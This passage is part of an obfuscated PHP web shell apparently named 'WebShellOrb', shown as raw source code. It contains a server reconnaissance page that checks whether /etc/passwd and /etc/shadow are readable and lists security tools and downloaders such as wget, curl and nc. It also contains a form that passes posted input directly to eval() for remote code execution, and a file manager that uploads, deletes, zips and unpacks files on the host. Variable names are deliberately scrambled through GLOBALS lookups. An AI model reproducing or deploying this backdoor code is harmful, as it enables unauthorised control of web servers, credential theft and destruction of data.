    } elseif ((${${"GLOBALS"}["qtdsyeg"]} & 0x6000) == 0x6000) {
        ${${"GLOBALS"}["clkuyojj"]} = "b";
    } elseif ((${${"GLOBALS"}["vwhnmvbzmuqd"]} & 0x4000) == 0x4000) {
        ${${"GLOBALS"}["nhlvkvrl"]} = "d";
    } elseif ((${$ctwfzevrci} & 0x2000) == 0x2000) {
        ${${"GLOBALS"}["clkuyojj"]} = "c";
    } elseif ((${$vlkybhpqjn} & 0x1000) == 0x1000) {
        ${$mhcxeci} = "p";
    } else {
        ${${"GLOBALS"}["clkuyojj"]} = "u";
    }
    ${${"GLOBALS"}["clkuyojj"]} .= ${${"GLOBALS"}["kyhbiltfi"]} & 0x100 ? "r" : "-";
    ${${"GLOBALS"}["clkuyojj"]} .= ${${"GLOBALS"}["vwhnmvbzmuqd"]} & 0x80 ? "w" : "-";
    ${"GLOBALS"}["yxcnjhn"] = "i";
    ${${"GLOBALS"}["ohjadiupdto"]} .= ${$ilolonrsko} & 0x40 ? ${${"GLOBALS"}["vwhnmvbzmuqd"]} & 0x800 ? "s" : "x" : (${${"GLOBALS"}["vwhnmvbzmuqd"]} & 0x800 ? "S" : "-");
    ${${"GLOBALS"}["clkuyojj"]} .= ${$qkybts} & 0x20 ? "r" : "-";
    ${"GLOBALS"}["shsxvtn"] = "p";
    ${${"GLOBALS"}["clkuyojj"]} .= ${${"GLOBALS"}["vwhnmvbzmuqd"]} & 0x10 ? "w" : "-";
    ${${"GLOBALS"}["yxcnjhn"]} .= ${${"GLOBALS"}["vwhnmvbzmuqd"]} & 0x8 ? ${${"GLOBALS"}["shsxvtn"]} & 0x400 ? "s" : "x" : (${$iwcqbfpgngg} & 0x400 ? "S" : "-");
    ${${"GLOBALS"}["clkuyojj"]} .= ${${"GLOBALS"}["idxhruzeutti"]} & 0x4 ? "r" : "-";
    ${${"GLOBALS"}["clkuyojj"]} .= ${${"GLOBALS"}["olqfmkengz"]} & 0x2 ? "w" : "-";
    ${${"GLOBALS"}["clkuyojj"]} .= ${${"GLOBALS"}["vwhnmvbzmuqd"]} & 0x1 ? ${$qwyrtxgnisf} & 0x200 ? "t" : "x" : (${$jupethhvkj} & 0x200 ? "T" : "-");
    return ${${"GLOBALS"}["clkuyojj"]};
}
function WebShellOrbPermsColor($f)
{
    $hfgpvmt = "f";
    ${"GLOBALS"}["wmakjqctvr"] = "f";
    ${"GLOBALS"}["pigyuorhk"] = "f";
    if (!@is_readable(${${"GLOBALS"}["pigyuorhk"]})) {
        return "<font color=#FF0000>" . WebShellOrbPerms(@fileperms(${$hfgpvmt})) . "</font>";
    } elseif (!@is_writable(${${"GLOBALS"}["wmakjqctvr"]})) {
        return "<font color=white>" . WebShellOrbPerms(@fileperms(${${"GLOBALS"}["sberlg"]})) . "</font>";
    } else {
        return "<font color=#25ff00>" . WebShellOrbPerms(@fileperms(${${"GLOBALS"}["sberlg"]})) . "</font>";
    }
}
function WebShellOrbScandir($dir)
{
    if (function_exists("scandir")) {
        return scandir(${${"GLOBALS"}["leuwumt"]});
    } else {
        $otrhvbrub = "dh";
        $psbyngpqum = "dir";
        ${"GLOBALS"}["iscgrvyvt"] = "files";
        ${${"GLOBALS"}["qubwkb"]} = opendir(${$psbyngpqum});
        while (false !== (${${"GLOBALS"}["rbasqp"]} = readdir(${$otrhvbrub}))) {
            ${${"GLOBALS"}["yluxecll"]}[] = ${${"GLOBALS"}["rbasqp"]};
        }
        return ${${"GLOBALS"}["iscgrvyvt"]};
    }
}
function WebShellOrbWhich($p)
{
    $xtktpfotwm = "path";
    $sdrdcmtgqy = "path";
    $xawrvw = "path";
    ${$xtktpfotwm} = WebShellOrbEx("which " . ${${"GLOBALS"}["vwhnmvbzmuqd"]});
    if (!empty(${$sdrdcmtgqy})) {
        return ${$xawrvw};
    }
    return false;
}
function actionSecInfo()
{
    $domtksocnh = "temp";
    WebShellOrbHeader();
    echo "<h1>Server security information</h1><div class=content>";
    function WebShellOrbSecParam($n, $v)
    {
        $nhauwowc = "v";
        ${${"GLOBALS"}["vvdxmjbgec"]} = trim(${$nhauwowc});
        if (${${"GLOBALS"}["vvdxmjbgec"]}) {
            echo "<span>" . ${${"GLOBALS"}["onmdrx"]} . ": </span>";
            $hvsxdsrcv = "v";
            if (strpos(${$hvsxdsrcv}, "\n") === false) {
                echo ${${"GLOBALS"}["vvdxmjbgec"]} . "<br>";
            } else {
                echo "<pre class=ml1>" . ${${"GLOBALS"}["vvdxmjbgec"]} . "</pre>";
            }
        }
    }
    WebShellOrbSecParam("Server software", @getenv("SERVER_SOFTWARE"));
    if (function_exists("apache_get_modules")) {
        WebShellOrbSecParam("Loaded Apache modules", implode(", ", apache_get_modules()));
    }
    WebShellOrbSecParam("Disabled PHP Functions", $GLOBALS["disable_functions"] ? $GLOBALS["disable_functions"] : "none");
    WebShellOrbSecParam("Open base dir", @ini_get("open_basedir"));
    WebShellOrbSecParam("Safe mode exec dir", @ini_get("safe_mode_exec_dir"));
    ${"GLOBALS"}["ydhhbkwyd"] = "temp";
    WebShellOrbSecParam("Safe mode include dir", @ini_get("safe_mode_include_dir"));
    WebShellOrbSecParam("cURL support", function_exists("curl_version") ? "enabled" : "no");
    ${"GLOBALS"}["obxtsbkf"] = "temp";
    ${${"GLOBALS"}["mercgmdwe"]} = array();
    if (function_exists("mysql_get_client_info")) {
        ${${"GLOBALS"}["mercgmdwe"]}[] = "MySql (" . mysql_get_client_info() . ")";
    }
    if (function_exists("mssql_connect")) {
        ${${"GLOBALS"}["mercgmdwe"]}[] = "MSSQL";
    }
    if (function_exists("pg_connect")) {
        ${${"GLOBALS"}["ydhhbkwyd"]}[] = "PostgreSQL";
    }
    if (function_exists("oci_connect")) {
        ${${"GLOBALS"}["obxtsbkf"]}[] = "Oracle";
    }
    WebShellOrbSecParam("Supported databases", implode(", ", ${$domtksocnh}));
    echo "<br>";
    if ($GLOBALS["os"] == "nix") {
        WebShellOrbSecParam("Readable /etc/passwd", @is_readable("/etc/passwd") ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : "no");
        WebShellOrbSecParam("Readable /etc/shadow", @is_readable("/etc/shadow") ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>" : "no");
        WebShellOrbSecParam("OS version", @file_get_contents("/proc/version"));
        WebShellOrbSecParam("Distr name", @file_get_contents("/etc/issue.net"));
        if (!$GLOBALS["safe_mode"]) {
            $ydxmggcqmkt = "userful";
            $dvbwwqcdpb = "userful";
            ${"GLOBALS"}["eyrbmlm"] = "downloaders";
            ${$dvbwwqcdpb} = array("gcc", "lcc", "cc", "ld", "make", "php", "perl", "python", "ruby", "tar", "gzip", "bzip", "bzip2", "nc", "locate", "suidperl");
            ${"GLOBALS"}["cgkqyr"] = "temp";
            ${"GLOBALS"}["lgubixlbyzdk"] = "temp";
            ${${"GLOBALS"}["phgjytx"]} = array("kav", "nod32", "bdcored", "uvscan", "sav", "drwebd", "clamd", "rkhunter", "chkrootkit", "iptables", "ipfw", "tripwire", "shieldcc", "portsentry", "snort", "ossec", "lidsadm", "tcplodg", "sxid", "logcheck", "logwatch", "sysmask", "zmbscap", "sawmill", "wormscan", "ninja");
            ${${"GLOBALS"}["eyrbmlm"]} = array("wget", "fetch", "lynx", "links", "curl", "get", "lwp-mirror");
            ${"GLOBALS"}["fbbgsxezkw"] = "downloaders";
            echo "<br>";
            ${${"GLOBALS"}["cgkqyr"]} = array();
            ${"GLOBALS"}["kieabyzpe"] = "item";
            $cwtvyfrpbof = "temp";
            foreach (${$ydxmggcqmkt} as ${${"GLOBALS"}["kieabyzpe"]}) {
                $ivvheocsptu = "temp";
                if (WebShellOrbWhich(${${"GLOBALS"}["bdmqwqvfqn"]})) {
                    ${$ivvheocsptu}[] = ${${"GLOBALS"}["bdmqwqvfqn"]};
                }
            }
            WebShellOrbSecParam("Userful", implode(", ", ${$cwtvyfrpbof}));
            ${"GLOBALS"}["oubdfqdxj"] = "temp";
            ${${"GLOBALS"}["lgubixlbyzdk"]} = array();
            $mtkmrotbjk = "temp";
            foreach (${${"GLOBALS"}["phgjytx"]} as ${${"GLOBALS"}["bdmqwqvfqn"]}) {
                $lkqsebumlt = "item";
                $ymipnakanypt = "temp";
                if (WebShellOrbWhich(${${"GLOBALS"}["bdmqwqvfqn"]})) {
                    ${$ymipnakanypt}[] = ${$lkqsebumlt};
                }
            }
            WebShellOrbSecParam("Danger", implode(", ", ${${"GLOBALS"}["mercgmdwe"]}));
            ${${"GLOBALS"}["oubdfqdxj"]} = array();
            foreach (${${"GLOBALS"}["fbbgsxezkw"]} as ${${"GLOBALS"}["bdmqwqvfqn"]}) {
                ${"GLOBALS"}["oeqqhrcmpi"] = "item";
                if (WebShellOrbWhich(${${"GLOBALS"}["oeqqhrcmpi"]})) {
                    ${${"GLOBALS"}["mercgmdwe"]}[] = ${${"GLOBALS"}["bdmqwqvfqn"]};
                }
            }
            WebShellOrbSecParam("Downloaders", implode(", ", ${$mtkmrotbjk}));
            echo "<br/>";
            WebShellOrbSecParam("HDD space", WebShellOrbEx("df -h"));
            WebShellOrbSecParam("Hosts", @file_get_contents("/etc/hosts"));
            echo "<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit='g(null,null,\"5\",this.param1.value,this.param2.value);return false;'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=\">>\"></form>";
            if (isset($_POST["p2"], $_POST["p3"]) && is_numeric($_POST["p2"]) && is_numeric($_POST["p3"])) {
                ${"GLOBALS"}["fyllsuxigk"] = "temp";
                ${${"GLOBALS"}["fyllsuxigk"]} = "";
                $ycgoqwhau = "temp";
                for (; $_POST["p2"] <= $_POST["p3"]; $_POST["p2"]++) {
                    $yntzsuru = "uid";
                    $llkcgbksjw = "uid";
                    ${"GLOBALS"}["wmupdsqhyt"] = "uid";
                    ${$yntzsuru} = @posix_getpwuid($_POST["p2"]);
                    if (${${"GLOBALS"}["wmupdsqhyt"]}) {
                        ${${"GLOBALS"}["mercgmdwe"]} .= join(":", ${$llkcgbksjw}) . "\n";
                    }
                }
                echo "<br/>";
                WebShellOrbSecParam("Users", ${$ycgoqwhau});
            }
        }
    } else {
        WebShellOrbSecParam("OS Version", WebShellOrbEx("ver"));
        WebShellOrbSecParam("Account Settings", WebShellOrbEx("net accounts"));
        WebShellOrbSecParam("User Accounts", WebShellOrbEx("net user"));
    }
    echo "</div>";
    WebShellOrbFooter();
}
function actionPhp()
{
    if (isset($_POST["ajax"])) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]) . "ajax", true);
        ob_start();
        eval($_POST["p1"]);
        ${${"GLOBALS"}["mercgmdwe"]} = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
        $qpbfjuxdtq = "temp";
        echo strlen(${$qpbfjuxdtq}), "\n", ${${"GLOBALS"}["mercgmdwe"]};
        exit;
    }
    if (empty($_POST["ajax"]) && !empty($_POST["p1"])) {
        WebShellOrbsetcookie(md5($_SERVER["HTTP_HOST"]) . "ajax", 0);
    }
    WebShellOrbHeader();
    if (isset($_POST["p2"]) && $_POST["p2"] == "info") {
        echo "<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>";
        ob_start();
        phpinfo();
        ${${"GLOBALS"}["ecbcmiybue"]} = ob_get_clean();
        ${${"GLOBALS"}["ecbcmiybue"]} = preg_replace(array("!(body|a:\\w+|body, td, th, h1, h2) {.*}!msiU", "!td, th {(.*)}!msiU", "!<img[^>]+>!msiU"), array("", ".e, .v, .h, .h th {\$1}", ""), ${${"GLOBALS"}["ecbcmiybue"]});
        echo str_replace("<h1", "<h2", ${${"GLOBALS"}["ecbcmiybue"]}) . "</div><br>";
    }
    echo "<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a('Php',null,this.code.value);}else{g('Php',null,this.code.value,'');}return false;\"><textarea name=code class=bigarea id=PhpCode>" . (!empty($_POST["p1"]) ? htmlspecialchars($_POST["p1"]) : "") . "</textarea><input type=submit value=Eval style=\"margin-top:5px\">";
    echo " <input type=checkbox name=ajax value=1 " . ($_COOKIE[md5($_SERVER["HTTP_HOST"]) . "ajax"] ? "checked" : "") . "> send using AJAX</form><pre id=PhpOutput style=\"" . (empty($_POST["p1"]) ? "display:none;" : "") . "margin-top:5px;\" class=ml1>";
    if (!empty($_POST["p1"])) {
        ob_start();
        eval($_POST["p1"]);
        echo htmlspecialchars(ob_get_clean());
    }
    echo "</pre></div>";
    WebShellOrbFooter();
}
function actionFilesMan()
{
    if (!empty($_COOKIE["f"])) {
        $_COOKIE["f"] = @unserialize($_COOKIE["f"]);
    }
    ${"GLOBALS"}["zipfvc"] = "i";
    ${"GLOBALS"}["uybulpgdyfek"] = "dirContent";
    $nqwroep = "sort";
    if (!empty($_POST["p1"])) {
        switch ($_POST["p1"]) {
            case "uploadFile":
                if (!@move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
                    echo "Can't upload!";
                }
                break;
            case "mkdir":
                if (!@mkdir($_POST["p2"])) {
                    echo "Can't create!";
                }
                break;
            case "delete":
                function deleteDir($path)
                {
                    ${"GLOBALS"}["tyivhisdf"] = "dh";
                    ${"GLOBALS"}["hsdgjldoiv"] = "path";
                    $nqtkcimv = "path";
                    ${"GLOBALS"}["qeascvequr"] = "path";
                    ${${"GLOBALS"}["hsdgjldoiv"]} = substr(${${"GLOBALS"}["ffswlhab"]}, -1) == "/" ? ${${"GLOBALS"}["qeascvequr"]} : ${$nqtkcimv} . "/";
                    ${"GLOBALS"}["onggmjje"] = "item";
                    ${${"GLOBALS"}["tyivhisdf"]} = opendir(${${"GLOBALS"}["ffswlhab"]});
                    while ((${${"GLOBALS"}["onggmjje"]} = readdir(${${"GLOBALS"}["qubwkb"]})) !== false) {
                        ${"GLOBALS"}["beufkfvrowh"] = "item";
                        ${"GLOBALS"}["ysndbcr"] = "item";
                        ${"GLOBALS"}["onmtwol"] = "item";
                        $nnxvvisqys = "type";
                        $rhijetcnxolz = "item";
                        $xnjcrutjrcsn = "path";
                        ${${"GLOBALS"}["beufkfvrowh"]} = ${$xnjcrutjrcsn} . ${${"GLOBALS"}["onmtwol"]};
                        if (basename(${$rhijetcnxolz}) == ".." || basename(${${"GLOBALS"}["bdmqwqvfqn"]}) == ".") {
                            continue;
                        }
                        ${$nnxvvisqys} = filetype(${${"GLOBALS"}["ysndbcr"]});
                        if (${${"GLOBALS"}["vxhdoihqlkd"]} == "dir") {
                            deleteDir(${${"GLOBALS"}["bdmqwqvfqn"]});
                        } else {
                            @unlink(${${"GLOBALS"}["bdmqwqvfqn"]});
                        }
                    }
                    closedir(${${"GLOBALS"}["qubwkb"]});
                    @rmdir(${${"GLOBALS"}["ffswlhab"]});
                }
                if (is_array(@$_POST["f"])) {
                    foreach ($_POST["f"] as ${${"GLOBALS"}["sberlg"]}) {
                        $oqqgeuaw = "f";
                        ${"GLOBALS"}["qvynxye"] = "f";
                        if (${${"GLOBALS"}["sberlg"]} == "..") {
                            continue;
                        }
                        ${${"GLOBALS"}["qvynxye"]} = urldecode(${${"GLOBALS"}["sberlg"]});
                        $knyiyrjbngh = "f";
                        if (is_dir(${$knyiyrjbngh})) {
                            deleteDir(${$oqqgeuaw});
                        } else {
                            @unlink(${${"GLOBALS"}["sberlg"]});
                        }
                    }
                }
                break;
            case "paste":
                if ($_COOKIE["act"] == "copy") {
                    ${"GLOBALS"}["ckzlqvynxr"] = "f";
                    function copy_paste($c, $s, $d)
                    {
                        ${"GLOBALS"}["fagwgfre"] = "c";
                        $hvvjqfgsnbl = "s";
                        ${"GLOBALS"}["dcsfki"] = "s";
                        $oswcoish = "d";
                        $ckvihtigyzh = "s";
                        if (is_dir(${${"GLOBALS"}["sbuwwkozt"]} . ${${"GLOBALS"}["dcsfki"]})) {
                            ${"GLOBALS"}["vpkbwytyc"] = "d";
                            $dezosh = "h";
                            mkdir(${${"GLOBALS"}["vpkbwytyc"]} . ${${"GLOBALS"}["uopupgy"]});
                            $ciuvfitrhtj = "h";
                            ${$dezosh} = @opendir(${${"GLOBALS"}["sbuwwkozt"]} . ${${"GLOBALS"}["uopupgy"]});
                            while ((${${"GLOBALS"}["sberlg"]} = @readdir(${$ciuvfitrhtj})) !== false) {
                                $cplqlcligwi = "d";
                                $ojvunulgmom = "f";
                                if (${${"GLOBALS"}["sberlg"]} != "." and ${$ojvunulgmom} != "..") {
                                    copy_paste(${${"GLOBALS"}["sbuwwkozt"]} . ${${"GLOBALS"}["uopupgy"]} . "/", ${${"GLOBALS"}["sberlg"]}, ${$cplqlcligwi} . ${${"GLOBALS"}["uopupgy"]} . "/");
                                }
                            }
                        } elseif (is_file(${${"GLOBALS"}["fagwgfre"]} . ${$ckvihtigyzh})) {
                            @copy(${${"GLOBALS"}["sbuwwkozt"]} . ${$hvvjqfgsnbl}, ${$oswcoish} . ${${"GLOBALS"}["uopupgy"]});
                        }
                    }
                    ${"GLOBALS"}["igaqgk"] = "f";
                    foreach ($_COOKIE["f"] as ${${"GLOBALS"}["ckzlqvynxr"]}) {
                        copy_paste($_COOKIE["c"], ${${"GLOBALS"}["igaqgk"]}, $GLOBALS["cwd"]);
                    }
                } elseif ($_COOKIE["act"] == "move") {
                    $rhlfmvixur = "f";
                    function move_paste($c, $s, $d)
                    {
                        $ahtgbwuonw = "s";
                        $ckcnhxgr = "c";
                        $qppskt = "s";
                        if (is_dir(${${"GLOBALS"}["sbuwwkozt"]} . ${${"GLOBALS"}["uopupgy"]})) {
                            $pkkrsanx = "f";
                            ${"GLOBALS"}["osjfesfa"] = "s";
                            ${"GLOBALS"}["nocfbvcoh"] = "s";
                            $udkwdkzhbud = "c";
                            mkdir(${${"GLOBALS"}["smcbgcyi"]} . ${${"GLOBALS"}["osjfesfa"]});
                            $sutihmtajih = "h";
                            ${$sutihmtajih} = @opendir(${$udkwdkzhbud} . ${${"GLOBALS"}["nocfbvcoh"]});
                            while ((${$pkkrsanx} = @readdir(${${"GLOBALS"}["aihxtguj"]})) !== false) {
                                ${"GLOBALS"}["cnuikedo"] = "s";
                                if (${${"GLOBALS"}["sberlg"]} != "." and ${${"GLOBALS"}["sberlg"]} != "..") {
                                    copy_paste(${${"GLOBALS"}["sbuwwkozt"]} . ${${"GLOBALS"}["cnuikedo"]} . "/", ${${"GLOBALS"}["sberlg"]}, ${${"GLOBALS"}["smcbgcyi"]} . ${${"GLOBALS"}["uopupgy"]} . "/");
                                }
                            }
                        } elseif (@is_file(${${"GLOBALS"}["sbuwwkozt"]} . ${${"GLOBALS"}["uopupgy"]})) {
                            @copy(${$ckcnhxgr} . ${$ahtgbwuonw}, ${${"GLOBALS"}["smcbgcyi"]} . ${$qppskt});
                        }
                    }
                    foreach ($_COOKIE["f"] as ${${"GLOBALS"}["sberlg"]}) {
                        @rename($_COOKIE["c"] . ${${"GLOBALS"}["sberlg"]}, $GLOBALS["cwd"] . ${$rhlfmvixur});
                    }
                } elseif ($_COOKIE["act"] == "zip") {
                    if (class_exists("ZipArchive")) {
                        $xkzwkjkkkw = "zip";
                        ${$xkzwkjkkkw} = new ZipArchive();
                        if ($zip->open($_POST["p2"], 1)) {
                            chdir($_COOKIE["c"]);
                            $turyinpqob = "f";
                            foreach ($_COOKIE["f"] as ${$turyinpqob}) {
                                $dgpduipixc = "f";
                                $ouqnccnwl = "f";
                                if (${$dgpduipixc} == "..") {
                                    continue;
                                }
                                if (@is_file($_COOKIE["c"] . ${${"GLOBALS"}["sberlg"]})) {
                                    $zip->addFile($_COOKIE["c"] . ${${"GLOBALS"}["sberlg"]}, ${$ouqnccnwl});
                                } elseif (@is_dir($_COOKIE["c"] . ${${"GLOBALS"}["sberlg"]})) {
                                    ${"GLOBALS"}["vewtqi"] = "f";
                                    ${"GLOBALS"}["qunyavcp"] = "key";
                                    ${"GLOBALS"}["yeflfsw"] = "value";
                                    $rimshoiye = "iterator";
                                    ${${"GLOBALS"}["xqjcyjffi"]} = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(${${"GLOBALS"}["vewtqi"]} . "/", FilesystemIterator::SKIP_DOTS));
                                    foreach (${$rimshoiye} as ${${"GLOBALS"}["qunyavcp"]} => ${${"GLOBALS"}["yeflfsw"]}) {
                                        $smkpdcroxja = "key";
                                        $zip->addFile(realpath(${${"GLOBALS"}["oocwabo"]}), ${$smkpdcroxja});
                                    }
                                }
                            }
                            chdir($GLOBALS["cwd"]);
                            $zip->close();
                        }
                    }
                } elseif ($_COOKIE["act"] == "unzip") {
                    if (class_exists("ZipArchive")) {
                        ${"GLOBALS"}["edkqvu"] = "zip";
                        ${${"GLOBALS"}["edkqvu"]} = new ZipArchive();
                        foreach ($_COOKIE["f"] as ${${"GLOBALS"}["sberlg"]}) {
                            ${"GLOBALS"}["tonnmmh"] = "f";
                            if ($zip->open($_COOKIE["c"] . ${${"GLOBALS"}["tonnmmh"]})) {
                                $zip->extractTo($GLOBALS["cwd"]);
                                $zip->close();
                            }
                        }
                    }
                } elseif ($_COOKIE["act"] == "tar") {
                    chdir($_COOKIE["c"]);
                    $_COOKIE["f"] = array_map("escapeshellarg", $_COOKIE["f"]);
                    WebShellOrbEx("tar cfzv " . escapeshellarg($_POST["p2"]) . " " . implode(" ", $_COOKIE["f"]));
                    chdir($GLOBALS["cwd"]);
                }
                unset($_COOKIE["f"]);
                setcookie("f", "", time() - 3600);
                break;
            default:
                if (!empty($_POST["p1"])) {
                    WebShellOrbsetcookie("act", $_POST["p1"]);
                    WebShellOrbsetcookie("f", serialize(@$_POST["f"]));
                    WebShellOrbsetcookie("c", @$_POST["c"]);
                }
                break;
        }
    }
    ${"GLOBALS"}["qvpbfls"] = "dirContent";
    $kmcbnuop = "sort";
    WebShellOrbHeader();
    echo "<h1>File manager</h1><div class=content><script>p1_=p2_=p3_=\"\";</script>";
    ${${"GLOBALS"}["qvpbfls"]} = WebShellOrbScandir(isset($_POST["c"]) ? $_POST["c"] : $GLOBALS["cwd"]);
    if (${${"GLOBALS"}["uybulpgdyfek"]} === false) {
        echo "Can't open this folder!";
        WebShellOrbFooter();
        return;
    }
    ${"GLOBALS"}["urslvvevcyd"] = "files";
    global $sort;
    ${$kmcbnuop} = array("name", 1);
    ${"GLOBALS"}["ucfmbrelsm"] = "files";
    if (!empty($_POST["p1"])) {
        ${"GLOBALS"}["xqnxrgg"] = "match";
        if (preg_match("!s_([A-z]+)_(\\d{1})!", $_POST["p1"], ${${"GLOBALS"}["xqnxrgg"]})) {
            ${${"GLOBALS"}["wxflrkghg"]} = array(${${"GLOBALS"}["khtkbtbcp"]}[1], (int) ${${"GLOBALS"}["khtkbtbcp"]}[2]);
        }
    }
    echo "<script>\n\tfunction sa() {\n\t\tfor(i=0;i<d.files.elements.length;i++)\n\t\t\tif(d.files.elements[i].type == 'checkbox')\n\t\t\t\td.files.elements[i].checked = d.files.elements[0].checked;\n\t}\n</script>\n<table width='100%' class='main' cellspacing='0' cellpadding='2'>\n<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . (${${"GLOBALS"}["wxflrkghg"]}[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . (${${"GLOBALS"}["wxflrkghg"]}[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . (${${"GLOBALS"}["wxflrkghg"]}[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . (${$nqwroep}[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
    ${${"GLOBALS"}["xzocqroestsp"]} = ${${"GLOBALS"}["ucfmbrelsm"]} = array();
    ${"GLOBALS"}["pwjxzgtesey"] = "n";
    ${${"GLOBALS"}["onmdrx"]} = count(${${"GLOBALS"}["qanhuo"]});
    for (${${"GLOBALS"}["clkuyojj"]} = 0; ${${"GLOBALS"}["clkuyojj"]} < ${${"GLOBALS"}["pwjxzgtesey"]}; ${${"GLOBALS"}["zipfvc"]}++) {
        ${"GLOBALS"}["pdavystbnb"] = "dirContent";
        $dccmvjub = "tmp";
        ${"GLOBALS"}["rqmafuvr"] = "i";
        $igxyngssey = "tmp";
        $olxfijt = "dirContent";
        ${"GLOBALS"}["mlougu"] = "i";
        $xqzsqep = "dirContent";
        ${"GLOBALS"}["phbvllhebmmy"] = "i";
        ${"GLOBALS"}["egevsdguy"] = "i";
        $umpvgjutp = "gr";
        ${"GLOBALS"}["jjvkvgxrrgr"] = "gr";
        ${"GLOBALS"}["kyldppgou"] = "dirContent";
        $dfpwsfgwzk = "i";
        ${${"GLOBALS"}["zppzcsfgo"]} = @posix_getpwuid(@fileowner(${$olxfijt}[${${"GLOBALS"}["clkuyojj"]}]));
        $kbjcjgsc = "i";
        ${"GLOBALS"}["yovvctdkx"] = "dirContent";
        $kvhmbnzvd = "dirContent";
        ${$umpvgjutp} = @posix_getgrgid(@filegroup(${${"GLOBALS"}["qanhuo"]}[${${"GLOBALS"}["phbvllhebmmy"]}]));
        $fdkdqgpmwo = "i";
        ${"GLOBALS"}["prriunh"] = "ow";
        ${${"GLOBALS"}["ecbcmiybue"]} = array("name" => ${${"GLOBALS"}["kyldppgou"]}[${${"GLOBALS"}["clkuyojj"]}], "path" => $GLOBALS["cwd"] . ${${"GLOBALS"}["qanhuo"]}[${${"GLOBALS"}["clkuyojj"]}], "modify" => date("Y-m-d H:i:s", @filemtime($GLOBALS["cwd"] . ${${"GLOBALS"}["qanhuo"]}[${$kbjcjgsc}])), "perms" => WebShellOrbPermsColor($GLOBALS["cwd"] . ${${"GLOBALS"}["qanhuo"]}[${${"GLOBALS"}["clkuyojj"]}]), "size" => @filesize($GLOBALS["cwd"] . ${$kvhmbnzvd}[${$dfpwsfgwzk}]), "owner" => ${${"GLOBALS"}["prriunh"]}["name"] ? ${${"GLOBALS"}["zppzcsfgo"]}["name"] : @fileowner(${${"GLOBALS"}["pdavystbnb"]}[${${"GLOBALS"}["clkuyojj"]}]), "group" => ${${"GLOBALS"}["jjvkvgxrrgr"]}["name"] ? ${${"GLOBALS"}["punnqnswy"]}["name"] : @filegroup(${$xqzsqep}[${${"GLOBALS"}["mlougu"]}]));
        ${"GLOBALS"}["ihlumwlqnhp"] = "dirs";
        if (@is_file($GLOBALS["cwd"] . ${${"GLOBALS"}["qanhuo"]}[${$fdkdqgpmwo}])) {
            ${${"GLOBALS"}["yluxecll"]}[] = array_merge(${$igxyngssey}, array("type" => "file"));
        } elseif (@is_link($GLOBALS["cwd"] . ${${"GLOBALS"}["qanhuo"]}[${${"GLOBALS"}["rqmafuvr"]}])) {
            ${${"GLOBALS"}["xzocqroestsp"]}[] = array_merge(${${"GLOBALS"}["ecbcmiybue"]}, array("type" => "link", "link" => readlink(${$dccmvjub}["path"])));
        } elseif (@is_dir($GLOBALS["cwd"] . ${${"GLOBALS"}["yovvctdkx"]}[${${"GLOBALS"}["egevsdguy"]}])) {
            ${${"GLOBALS"}["ihlumwlqnhp"]}[] = array_merge(${${"GLOBALS"}["ecbcmiybue"]}, array("type" => "dir"));
        }
    }
    $GLOBALS["sort"] = ${${"GLOBALS"}["wxflrkghg"]};
    function WebShellOrbCmp($a, $b)
    {
        $wvhrpin = "b";
        $cemcmlklowtc = "a";
        if ($GLOBALS["sort"][0] != "size") {
            return strcmp(strtolower(${${"GLOBALS"}["cxfbyfxajt"]}[$GLOBALS["sort"][0]]), strtolower(${$wvhrpin}[$GLOBALS["sort"][0]])) * ($GLOBALS["sort"][1] ? 1 : -1);
        } else {
            return (${$cemcmlklowtc}["size"] < ${${"GLOBALS"}["slzbugds"]}["size"] ? -1 : 1) * ($GLOBALS["sort"][1] ? 1 : -1);
        }
    }
    usort(${${"GLOBALS"}["yluxecll"]}, "WebShellOrbCmp");
    usort(${${"GLOBALS"}["xzocqroestsp"]}, "WebShellOrbCmp");
    $fjurgbvuldau = "files";
    ${${"GLOBALS"}["yluxecll"]} = array_merge(${${"GLOBALS"}["xzocqroestsp"]}, ${${"GLOBALS"}["urslvvevcyd"]});
    ${${"GLOBALS"}["gayaio"]} = 0;
    foreach (${$fjurgbvuldau} as ${${"GLOBALS"}["sberlg"]}) {
        $dwvibzt = "f";
        $etnrnpxldmn = "f";
        ${"GLOBALS"}["ccfvqihqjil"] = "f";
        ${"GLOBALS"}["szfifyf"] = "f";
        $ftzjqt = "f";
        $gnoadugbfdu = "f";
        $djskevnnm = "f";
        $mhjrxxhgopd = "f";
        $lbmonmg = "f";
        ${"GLOBALS"}["zppmigmvqhk"] = "f";
        $kjkiswjllpu = "f";
        $oxvhme = "f";
        ${"GLOBALS"}["cpticd"] = "f";
        ${"GLOBALS"}["hthoifyfkl"] = "l";
